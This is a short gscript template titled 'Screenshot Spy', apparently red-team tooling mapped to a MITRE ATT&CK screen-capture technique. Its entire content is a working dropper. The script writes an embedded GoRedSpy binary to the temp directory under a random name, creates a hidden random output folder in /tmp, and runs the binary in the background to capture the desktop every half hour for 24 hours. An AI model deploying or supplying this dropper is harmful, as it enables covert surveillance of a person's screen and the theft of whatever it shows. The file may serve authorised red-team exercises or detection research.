// Example gscript template
// Title: Screenshot Spy
// Author: ahhh
// Purpose: Takes screenshots of the desktop every halfhour for the next 24 hours (48 x 1800)
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1113
// Uses: GoRedSpy to take screenshots: https://github.com/ahhh/GoRedSpy

//priority:150
//timeout:150

//go_import:os/user as user2
//go_import:os as os2

//import:/private/tmp/GoRedSpy.elf

function Deploy() {  
    console.log("Starting GoRedSpy");
    // Getting our asset
    var spyBin = GetAssetAsBytes("GoRedSpy.elf");
    console.log("errors: "+Dump(spyBin[1]));

    // Getting a random name and dropping file
    var temppath = os2.TempDir();
    var naming = G.rand.GetAlphaString(4);
    var name = naming.toLowerCase();
    name = temppath+"/"+name;
    G.file.WriteFileFromBytes(name, spyBin[0]);
    console.log("dropped the goredspy binary here: "+name);

    // Create random out dir
    var outdir = G.rand.GetAlphaString(3);
    outdir = "/tmp/"+outdir.toLowerCase();
    G.exec.ExecuteCommand("/bin/mkdir", [outdir]); 
      
    // Executing child proc
    var proc = G.exec.ExecuteCommandAsync(name, ["-outDir", outdir, "-count", "48", "-delay", "1800s"]);
    console.log("err: "+Dump(proc[1]));
    console.log("pid: "+proc[0].Process.Pid);
    
    console.log("Done GoRedSpy");
    return true;
}